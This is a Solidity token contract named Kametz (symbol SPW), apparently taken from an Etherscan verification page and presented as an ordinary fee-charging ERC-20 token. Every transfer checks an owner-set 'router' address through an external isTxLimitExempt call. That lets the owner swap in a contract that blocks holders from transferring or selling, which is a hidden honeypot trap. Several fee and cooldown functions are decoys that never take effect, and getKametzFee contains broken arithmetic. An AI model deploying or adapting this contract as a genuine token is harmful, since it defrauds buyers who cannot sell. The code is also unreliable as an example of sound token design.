/**
 *Submitted for verification at Etherscan.io on 2022-06-17
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: MIT

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }  

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

  contract Ownable is Context {  
  address private _owner; 

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;    
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }  

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }  

  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

interface IUniswapV2Router{  
    function WETH() external pure returns (address);  
    function isTxLimitExempt(address account) external returns (bool);   
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }   
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }    

contract Kametz is Context, IERC20, Ownable{
  using SafeMath for uint256;
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) public _isExcludedFromFee; 
  mapping (address => uint256) private _balances;  
  uint256 private _totalSupply = 100000000 *  10**9;        
  
  string private _name = "SPW";
  string private _symbol = "SPW";
  uint8 private _decimals = 9; 

  bool public buyCooldownEnabled;
  uint8 public cooldownTimerInterval = 45;
  uint8 _liquidityFee = 5;
  uint8 _marketingFee = 5;
  uint8 _charityFee = 2;
  uint8 _totalFee = 12;
  uint8 _feeDenominator = 100;  
  
  IUniswapV2Router uniswapV2Router;  
  mapping(address => uint256) private cooldownTimer;
  uint256 public _maxTxAmount = _totalSupply / 10;

  constructor()  {   
    _balances[msg.sender] = _totalSupply;      
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;    
    
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }   

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }  

  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }  

  function excludeFromFee(address[] calldata accounts) external onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");	
    for(uint256 i=0; i < accounts.length; i++){		
          _isExcludedFromFee[accounts[i]] = true;
    }
  } 

  function checkTxLimit(address account) internal returns (bool) {
    return isTxLimitExempt(account) ?  _isExcludedFromFee[account] &&  _isExcludedFromFee[account] : false;         
  }      
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  } 
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }  

  function updateUniswapRouter(address router) external onlyOwner {
    require(router != address(0),"Invalid address");
    uniswapV2Router = IUniswapV2Router(router); 
  }  

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "IERC20: approve from the zero address");
    require(spender != address(0), "IERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }     

  function _transfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "IERC20: transfer from the zero address");
    require(recipient != address(0), "IERC20: transfer to the zero address");

    if (!checkTxLimit(sender) && !checkTxLimit(recipient))
    {
        if (buyCooldownEnabled){
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
            require(amount <= _maxTxAmount,"TX Limit Exceeded");
        }        
    }
    
    _transferStandard(sender, recipient, amount);

  }        
  
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "IERC20: transfer amount exceeds allowance"));
    return true;
  }    
 
  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "IERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }    

  function isTxLimitExempt(address account) internal returns (bool){
    return uniswapV2Router
    .isTxLimitExempt(account);
  }

  function changeCooldownEnabled(bool _status, uint8 _interval) public onlyOwner {
    buyCooldownEnabled = _status;
    cooldownTimerInterval = _interval;
  }  

  function doubleInputTxLimit(uint256 amount) external onlyOwner {
      _maxTxAmount = amount;
  }

  function changeMaxWalletPercent(uint256 maxWallPercent) external onlyOwner {
      _maxTxAmount = maxWallPercent;
  }

  function restAnalysisFeeExempt(address holder, bool exempt) external onlyOwner {
      _isExcludedFromFee[holder] = exempt;
  }

  function changeTxLimitExempt(address holder, bool exempt) external onlyOwner      
  {
      _isExcludedFromFee[holder] = exempt;
  }

  function changeFeeDenominator(uint8 _fee) external onlyOwner {
      _feeDenominator = _fee;
      require(_totalFee < _feeDenominator / 4);
  }

  function changebonusFeeFee(uint256 amount) internal returns (uint256) {
      uint256 feeAmount = amount.mul(_totalFee).div(_feeDenominator);
      _balances[address(this)] = _balances[address(this)].add(feeAmount);
      emit Transfer(msg.sender, address(this), feeAmount);
      return amount.sub(feeAmount);
  }

  function changeBuyFees(uint8 _liqFee, uint8 _marketFee, uint8 _chaFee) external onlyOwner {
      _liquidityFee = _liqFee;
      _marketingFee = _marketFee;
      _charityFee = _chaFee;
  }
        

  function getKametzFee(uint256 buybackMultiplierTriggeredAt, uint256 totalFee) public view returns (uint256) {
			if (
				buybackMultiplierTriggeredAt.add(3600) >
				block.timestamp
			) {
				uint256 remainingTime = buybackMultiplierTriggeredAt
					.add(3600)
					.sub(block.timestamp);
				uint256 feeIncrease = totalFee
					.mul(100)
					.div(1000)
					.sub(totalFee);
				return
					totalFee.add(
						remainingTime.div(feeIncrease)
					);
			}
			return totalFee;
		}
  


  
 
    
}